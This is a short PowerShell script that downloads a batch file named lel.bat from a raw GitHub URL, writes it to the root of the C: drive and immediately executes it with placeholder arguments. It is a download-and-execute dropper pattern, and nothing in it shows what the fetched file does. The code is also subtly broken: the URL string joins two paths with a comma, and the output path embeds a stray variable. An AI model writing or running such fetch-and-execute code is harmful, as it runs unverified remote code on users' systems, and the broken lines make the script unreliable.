$wc = New-Object System.Net.WebClient
$url ="https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat, $PSScriptRoot/lel.bat"
$outpath ="$C:\lel.bat";
$wc.DownloadFile($url, $outpath)
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "C:/lel.bat" -ArgumentList $args
